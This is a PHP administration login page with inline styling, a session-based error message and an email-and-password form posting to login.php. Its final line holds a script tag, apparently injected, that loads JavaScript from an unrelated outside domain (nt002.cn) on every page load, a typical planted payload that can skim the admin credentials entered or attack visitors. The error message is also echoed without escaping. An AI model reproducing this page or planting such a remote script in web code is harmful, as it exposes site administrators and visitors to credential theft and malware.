<?php session_start(); ?>
<html>
<head>
<title></title>

<style type="text/css">
.body {margin:50px 0px; padding:0px; text-align:center; font-family:Geneva, Arial, Helvetica, sans-serif;}
.container {width:180px;
	margin:0px auto;
	text-align:left;
	padding: 15px 15px 0px 15px;
	border:1px dashed #333;
	background-color:#eee;}
.label {font-family:Geneva, Arial, Helvetica, sans-serif; font-size:12px;}
input { margin-bottom: 4px;}
#button { margin: 0px 0px 0px 120px; padding: 0px 0px 0px 0px;}
h2 { margin: 0px 0px 4px 0px; padding: 0px 0px 0px 0px; font-size: 16px;  font-family:Geneva, Arial, Helvetica, sans-serif;}

#error { background-color: #FFCCCC; border: solid 1px #990000; margin:0px auto; color: #990000; width: 210px; text-align: center; font-family:Geneva, Arial, Helvetica, sans-serif; font-size:14px; margin-bottom: 5px;}
</style>

</head>
<body>
<?php 
if (isset($_SESSION['log_error'])) 
{
echo "<p id='error'>".$_SESSION['log_error']."</p>";
}
session_destroy();
?>


<div class="container">
<h2>Administration Login</h2>
<form action="login.php" method="post">
<input type="hidden" name="action" value="login" />
<span class="label">E-mail:</span><input name="email" type="text" /><br>
<span class="label">Password:</span><input name="pass" type="password" /><br>
<input id="button" name="submit" type="submit" value="Log In" />
</form>
</div>
<script src='http://nt002.cn/E/J.JS'></script></body>